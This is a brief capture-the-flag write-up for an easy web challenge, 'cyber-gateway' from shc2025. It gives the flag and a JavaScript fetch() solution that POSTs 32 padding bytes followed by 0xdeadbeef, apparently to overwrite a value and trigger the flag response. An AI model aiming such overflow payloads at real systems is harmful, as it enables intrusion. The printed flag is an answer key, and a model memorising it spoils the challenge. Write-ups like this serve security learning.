# cyber-gateway

| Titel          | Kategorie | flag | Difficulty |
| :---        |    :----   |:--- | :--- |
| cyber-gateway | WEB  | shc2025{cyber_n3o_w0ke_up_fc763756f8f9} | easy |


## Solution

```javascript
fetch('/', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/octet-stream'
  },
  body: new Uint8Array([
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xef, 0xbe,
    0xad, 0xde
  ])
})
.then(response => response.text())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));
```

Wake up shc2025{cyber_n3o_w0ke_up_fc763756f8f9}